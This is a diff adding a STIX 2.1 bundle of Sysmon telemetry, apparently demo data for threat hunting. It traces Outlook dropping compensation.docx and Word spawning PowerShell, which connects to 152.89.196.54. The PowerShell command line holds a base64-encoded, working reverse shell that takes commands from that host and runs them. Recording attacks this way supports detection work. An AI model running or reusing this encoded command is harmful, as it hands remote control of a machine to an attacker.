@@ -1,0 +1,438 @@
+{
+  "type": "bundle",
+  "id": "bundle--1b5ae832-3ff4-430a-b9aa-4908a49e73e1",
+  "objects": [
+    {
+      "type": "identity",
+      "id": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+      "created": "2023-02-10T20:32:56.843Z",
+      "modified": "2023-02-10T20:32:56.843Z",
+      "name": "demo",
+      "identity_class": "program"
+    },
+    {
+      "type": "observed-data",
+      "id": "observed-data--099e0461-6f82-4ab6-af0f-1b249b2f634a",
+      "created_by_ref": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+      "created": "2023-02-10T20:32:57.382Z",
+      "modified": "2023-02-10T20:32:57.382Z",
+      "first_observed": "2023-02-10T17:49:04.495Z",
+      "last_observed": "2023-02-10T17:49:04.495Z",
+      "number_observed": 1,
+      "object_refs": [
+        "process--dab583c9-9c1d-5883-a92a-c65aae72ac70",
+        "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+        "directory--30b6c25d-82f4-51af-a3c8-51cb692dfd0a",
+        "directory--98fe2698-ebbd-504e-be01-beef3880d3eb",
+        "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+        "x-oca-event--a65a3096-faf2-4790-8c59-9b2244c5ff4e",
+        "process--8d29000a-7fe6-52b5-85b3-947114d7680b",
+        "file--a89e79af-b8c5-55a9-bcfb-b2fac45e8a68",
+        "file--f5a97a87-a8e7-56d2-b848-40a56e1e9cbb",
+        "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d",
+        "file--9cfa2f3a-7bd1-5242-855c-5edf32f3695b"
+      ],
+      "spec_version": "2.1"
+    },
+    {
+      "type": "x-oca-event",
+      "code": 1,
+      "action": "File created",
+      "provider": "Microsoft-Windows-Sysmon/Operational",
+      "process_ref": "process--8d29000a-7fe6-52b5-85b3-947114d7680b",
+      "parent_process_ref": "process--dab583c9-9c1d-5883-a92a-c65aae72ac70",
+      "user_ref": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "host_ref": "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+      "file_ref": "file--f5a97a87-a8e7-56d2-b848-40a56e1e9cbb",
+      "id": "x-oca-event--a65a3096-faf2-4790-8c59-9b2244c5ff4e",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "process",
+      "name": "outlook.exe",
+      "pid": 13412,
+      "x_unique_id": "{ef3dcf22-42bc-5f5f-4d00-000000000300}",
+      "parent_ref": "process--dab583c9-9c1d-5883-a92a-c65aae72ac70",
+      "creator_user_ref": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "id": "process--8d29000a-7fe6-52b5-85b3-947114d7680b",
+      "spec_version": "2.1",
+      "image_ref": "file--a89e79af-b8c5-55a9-bcfb-b2fac45e8a68"
+    },
+    {
+      "type": "file",
+      "name": "OUTLOOK.EXE",
+      "parent_directory_ref": "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d",
+      "hashes": {
+        "MD5": "5E6B9FCA30B926586EFD0BFFA963A4BE",
+        "SHA-1": "B47DE31A3EE68461C7CE6E75E8514E5D1BEF9BC1",
+        "SHA-256": "326F909470F562F20F0E66FEFE8C9936C0CF0269D0C87D107120C5E2AC06B9B5"
+      },
+      "id": "file--a89e79af-b8c5-55a9-bcfb-b2fac45e8a68",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "directory",
+      "path": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16",
+      "id": "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "process",
+      "name": "explorer.exe",
+      "pid": 6164,
+      "x_unique_id": "{7f07c11c-f5cd-5dcb-0000-00104fbbb400}",
+      "id": "process--dab583c9-9c1d-5883-a92a-c65aae72ac70",
+      "spec_version": "2.1",
+      "image_ref": "file--9cfa2f3a-7bd1-5242-855c-5edf32f3695b"
+    },
+    {
+      "type": "file",
+      "name": "explorer.exe",
+      "parent_directory_ref": "directory--30b6c25d-82f4-51af-a3c8-51cb692dfd0a",
+      "id": "file--9cfa2f3a-7bd1-5242-855c-5edf32f3695b",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "directory",
+      "path": "C:\\Windows",
+      "id": "directory--30b6c25d-82f4-51af-a3c8-51cb692dfd0a",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "user-account",
+      "account_login": "John",
+      "id": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "x-oca-asset",
+      "hostname": "atl008",
+      "ip_refs": [
+        "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d"
+      ],
+      "id": "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "file",
+      "name": "compensation.docx",
+      "parent_directory_ref": "directory--98fe2698-ebbd-504e-be01-beef3880d3eb",
+      "hashes": {
+        "MD5": "244CBE1FB8639076E38F80888947F2DE",
+        "SHA-1": "02C2707D4740C06E1C3B8EBCDEAB6952EB348ACA",
+        "SHA-256": "28D8989B746AE21FEAC6D22CDD6C9B947D75937DA68298B227362E19D219A662"
+      },
+      "id": "file--f5a97a87-a8e7-56d2-b848-40a56e1e9cbb",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "directory",
+      "path": "C:\\Users\\John\\Documents",
+      "id": "directory--98fe2698-ebbd-504e-be01-beef3880d3eb",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "observed-data",
+      "id": "observed-data--8fd3f298-9060-4f7c-b88d-d232a117d90f",
+      "created_by_ref": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+      "created": "2023-02-10T20:32:57.382Z",
+      "modified": "2023-02-10T20:32:57.382Z",
+      "first_observed": "2023-02-10T17:49:04.495Z",
+      "last_observed": "2023-02-10T17:49:04.495Z",
+      "number_observed": 1,
+      "object_refs": [
+        "process--dab583c9-9c1d-5883-a92a-c65aae72ac70",
+        "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+        "x-oca-event--4a4900f9-ec12-4c2e-99e7-af31a4c7b3e0",
+        "directory--30b6c25d-82f4-51af-a3c8-51cb692dfd0a",
+        "process--d10a7a12-110c-50e1-8485-72279d921dfc",
+        "file--f5e7d2e0-d20b-59d9-81c7-c04794e7cecf",
+        "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+        "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d",
+        "file--9cfa2f3a-7bd1-5242-855c-5edf32f3695b"
+      ],
+      "spec_version": "2.1"
+    },
+    {
+      "type": "x-oca-event",
+      "code": 1,
+      "action": "Process Creation",
+      "provider": "Microsoft-Windows-Sysmon/Operational",
+      "process_ref": "process--d10a7a12-110c-50e1-8485-72279d921dfc",
+      "parent_process_ref": "process--dab583c9-9c1d-5883-a92a-c65aae72ac70",
+      "user_ref": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "host_ref": "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+      "id": "x-oca-event--4a4900f9-ec12-4c2e-99e7-af31a4c7b3e0",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "process",
+      "name": "winword.exe",
+      "pid": 10468,
+      "x_unique_id": "{7f07c11c-f2a5-5dcf-0000-00106b796c0d}",
+      "parent_ref": "process--dab583c9-9c1d-5883-a92a-c65aae72ac70",
+      "creator_user_ref": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "id": "process--d10a7a12-110c-50e1-8485-72279d921dfc",
+      "spec_version": "2.1",
+      "image_ref": "file--f5e7d2e0-d20b-59d9-81c7-c04794e7cecf"
+    },
+    {
+      "type": "file",
+      "name": "WINWORD.EXE",
+      "parent_directory_ref": "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d",
+      "hashes": {
+        "MD5": "10B777CD1CC2D94C60707FB53B29BB7D",
+        "SHA-1": "2FA389B2CFBF11AA5F08609D019F1FD8B1233065",
+        "SHA-256": "75D216CDE89D62AE1F9A8137CE7EE32FEC7A1DA96826BE471E664223651720BC"
+      },
+      "id": "file--f5e7d2e0-d20b-59d9-81c7-c04794e7cecf",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "directory",
+      "path": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16",
+      "id": "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "process",
+      "name": "explorer.exe",
+      "pid": 6164,
+      "x_unique_id": "{7f07c11c-f5cd-5dcb-0000-00104fbbb400}",
+      "id": "process--dab583c9-9c1d-5883-a92a-c65aae72ac70",
+      "spec_version": "2.1",
+      "image_ref": "file--9cfa2f3a-7bd1-5242-855c-5edf32f3695b"
+    },
+    {
+      "type": "file",
+      "name": "explorer.exe",
+      "parent_directory_ref": "directory--30b6c25d-82f4-51af-a3c8-51cb692dfd0a",
+      "id": "file--9cfa2f3a-7bd1-5242-855c-5edf32f3695b",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "directory",
+      "path": "C:\\Windows",
+      "id": "directory--30b6c25d-82f4-51af-a3c8-51cb692dfd0a",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "user-account",
+      "account_login": "John",
+      "id": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "x-oca-asset",
+      "hostname": "atl008",
+      "ip_refs": [
+        "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d"
+      ],
+      "id": "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "observed-data",
+      "id": "observed-data--5c40038b-0dd3-40b8-9290-f106fec66e8e",
+      "created_by_ref": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+      "created": "2023-02-10T20:32:57.382Z",
+      "modified": "2023-02-10T20:32:57.382Z",
+      "first_observed": "2023-02-10T17:49:34.362Z",
+      "last_observed": "2023-02-10T17:49:34.362Z",
+      "number_observed": 1,
+      "object_refs": [
+        "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+        "file--95184090-b70d-53eb-b554-d64932c7ed63",
+        "x-oca-event--26ef498c-c06f-40a0-8b2f-916f7d29058d",
+        "process--d10a7a12-110c-50e1-8485-72279d921dfc",
+        "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+        "directory--349f0d32-95a1-5f1e-a0d3-cc941ca2468c",
+        "file--667f12f4-e0da-5198-9b16-11f9326d1336",
+        "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d",
+        "process--62ccf4b1-d62a-52dd-a682-37b3fcc9de65"
+      ],
+      "spec_version": "2.1"
+    },
+    {
+      "type": "x-oca-event",
+      "code": 1,
+      "action": "Process Creation",
+      "provider": "Microsoft-Windows-Sysmon/Operational",
+      "process_ref": "process--62ccf4b1-d62a-52dd-a682-37b3fcc9de65",
+      "parent_process_ref": "process--d10a7a12-110c-50e1-8485-72279d921dfc",
+      "user_ref": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "host_ref": "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+      "id": "x-oca-event--26ef498c-c06f-40a0-8b2f-916f7d29058d",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "process",
+      "name": "powershell.exe",
+      "parent_ref": "process--d10a7a12-110c-50e1-8485-72279d921dfc",
+      "pid": 11380,
+      "x_unique_id": "{7f07c11c-c0d7-5dcb-0000-001042920400}",
+      "command_line": "powershell -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA1ADIALgA4ADkALgAxADkANgAuADUANAAnACwAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAJABkAGEAdABhACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA0ACgA=",
+      "id": "process--62ccf4b1-d62a-52dd-a682-37b3fcc9de65",
+      "spec_version": "2.1",
+      "image_ref": "file--95184090-b70d-53eb-b554-d64932c7ed63"
+    },
+    {
+      "type": "file",
+      "name": "powershell.exe",
+      "hashes": {
+        "MD5": "04029E121A0CFA5991749937DD22A1D9",
+        "SHA-1": "F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054",
+        "SHA-256": "9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F"
+      },
+      "parent_directory_ref": "directory--349f0d32-95a1-5f1e-a0d3-cc941ca2468c",
+      "id": "file--95184090-b70d-53eb-b554-d64932c7ed63",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "directory",
+      "path": "C:\\Windows\\system32\\WindowsPowerShell\\v1.0",
+      "id": "directory--349f0d32-95a1-5f1e-a0d3-cc941ca2468c",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "process",
+      "name": "winword.exe",
+      "pid": 10468,
+      "x_unique_id": "{7f07c11c-f2a5-5dcf-0000-00106b796c0d}",
+      "id": "process--d10a7a12-110c-50e1-8485-72279d921dfc",
+      "spec_version": "2.1",
+      "image_ref": "file--667f12f4-e0da-5198-9b16-11f9326d1336"
+    },
+    {
+      "type": "file",
+      "name": "WINWORD.EXE",
+      "parent_directory_ref": "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d",
+      "id": "file--667f12f4-e0da-5198-9b16-11f9326d1336",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "directory",
+      "path": "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16",
+      "id": "directory--23d6ea0b-cc7c-5b99-af3f-6f89a05de31d",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "user-account",
+      "account_login": "John",
+      "id": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "x-oca-asset",
+      "hostname": "atl008",
+      "ip_refs": [
+        "directory--349f0d32-95a1-5f1e-a0d3-cc941ca2468c"
+      ],
+      "id": "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "observed-data",
+      "id": "observed-data--68c7a316-7e2b-4a76-8f1e-5f2a214144a1",
+      "created_by_ref": "identity--a8c7eb5e-2de5-4e57-9e96-3b1f88bd24dc",
+      "created": "2023-02-10T20:32:57.382Z",
+      "modified": "2023-02-10T20:32:57.382Z",
+      "number_observed": 1,
+      "first_observed": "2023-02-10T17:49:35.013Z",
+      "last_observed": "2023-02-10T17:49:35.013Z",
+      "object_refs": [
+        "x-oca-event--aff1d2ca-c0e5-49b4-9571-77e580522495",
+        "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+        "ipv4-addr--b8cebe95-e8ae-5060-b2d8-6bcdccc65957",
+        "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+        "network-traffic--6a0b5497-ac75-5a0e-afe0-4f9921ab1653",
+        "ipv4-addr--93aef2d0-9209-5529-96f0-d768d5b8e8b8",
+        "directory--349f0d32-95a1-5f1e-a0d3-cc941ca2468c",
+        "file--0a40b757-ce73-5d47-b244-9795d5718876",
+        "process--62ccf4b1-d62a-52dd-a682-37b3fcc9de65"
+      ],
+      "spec_version": "2.1"
+    },
+    {
+      "type": "ipv4-addr",
+      "value": "152.89.196.54",
+      "id": "ipv4-addr--b8cebe95-e8ae-5060-b2d8-6bcdccc65957",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "network-traffic",
+      "dst_ref": "ipv4-addr--b8cebe95-e8ae-5060-b2d8-6bcdccc65957",
+      "dst_port": 80,
+      "protocols": [
+        "ipv4",
+        "tcp"
+      ],
+      "src_ref": "ipv4-addr--93aef2d0-9209-5529-96f0-d768d5b8e8b8",
+      "src_port": 65311,
+      "id": "network-traffic--6a0b5497-ac75-5a0e-afe0-4f9921ab1653",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "x-oca-asset",
+      "hostname": "atl008",
+      "ip_refs": [
+        "ipv4-addr--93aef2d0-9209-5529-96f0-d768d5b8e8b8"
+      ],
+      "id": "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "ipv4-addr",
+      "value": "192.168.1.108",
+      "id": "ipv4-addr--93aef2d0-9209-5529-96f0-d768d5b8e8b8",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "user-account",
+      "account_login": "John",
+      "id": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "x-oca-event",
+      "network_ref": "network-traffic--6a0b5497-ac75-5a0e-afe0-4f9921ab1653",
+      "host_ref": "x-oca-asset--bdbbf36c-142b-5740-8d6e-20d7f016c257",
+      "user_ref": "user-account--5aa675d9-dce7-5715-83bb-26051a2ace61",
+      "process_ref": "process--62ccf4b1-d62a-52dd-a682-37b3fcc9de65",
+      "ip_refs": [
+        "ipv4-addr--b8cebe95-e8ae-5060-b2d8-6bcdccc65957",
+        "ipv4-addr--93aef2d0-9209-5529-96f0-d768d5b8e8b8"
+      ],
+      "provider": "Microsoft-Windows-Sysmon/Operational",
+      "code": 3,
+      "action": "Network connection",
+      "id": "x-oca-event--aff1d2ca-c0e5-49b4-9571-77e580522495",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "process",
+      "name": "powershell.exe",
+      "pid": 11380,
+      "x_unique_id": "{7f07c11c-c0d7-5dcb-0000-001042920400}",
+      "opened_connection_refs": [
+        "network-traffic--6a0b5497-ac75-5a0e-afe0-4f9921ab1653"
+      ],
+      "id": "process--62ccf4b1-d62a-52dd-a682-37b3fcc9de65",
+      "spec_version": "2.1",
+      "image_ref": "file--0a40b757-ce73-5d47-b244-9795d5718876"
+    },
+    {
+      "type": "file",
+      "name": "powershell.exe",
+      "parent_directory_ref": "directory--349f0d32-95a1-5f1e-a0d3-cc941ca2468c",
+      "id": "file--0a40b757-ce73-5d47-b244-9795d5718876",
+      "spec_version": "2.1"
+    },
+    {
+      "type": "directory",
+      "path": "C:\\Windows\\system32\\WindowsPowerShell\\v1.0",
+      "id": "directory--349f0d32-95a1-5f1e-a0d3-cc941ca2468c",
+      "spec_version": "2.1"
+    }
+  ]
+}
